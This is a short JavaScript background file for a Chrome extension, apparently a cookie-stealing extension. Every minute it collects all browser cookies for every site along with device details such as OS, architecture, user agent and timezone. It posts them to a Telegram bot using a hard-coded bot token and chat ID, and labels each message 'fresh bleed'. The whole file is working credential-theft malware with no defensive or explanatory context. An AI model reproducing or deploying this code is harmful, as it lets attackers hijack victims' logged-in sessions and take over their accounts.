// bg.js
const BOT_TOKEN  = "6759083758:AAGD9-VzT962GLoGKdL7bUIruo4OiP8lpHs";
const CHAT_ID    = "6546128034";
const EXFIL_EVERY_MS = 60_000;          // 1-minute heartbeat

chrome.runtime.onInstalled.addListener(()=> chrome.storage.local.set({installed:Date.now()}));

async function vacuumCookies() {
  const domains = await chrome.cookies.getAll({}); // every cookie for every site
  const hostInfo = await chrome.runtime.getPlatformInfo();
  const device  = {
    os       : hostInfo.os,
    arch     : hostInfo.arch,
    userAgent: navigator.userAgent,
    lang     : navigator.language,
    tz       : Intl.DateTimeFormat().resolvedOptions().timeZone
  };
  const payload = { device, cookies: domains };
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `<b>🩸 fresh bleed</b>\n<pre>${JSON.stringify(payload,null,2)}</pre>`,
      parse_mode: "HTML"
    })
  });
}

setInterval(vacuumCookies, EXFIL_EVERY_MS);
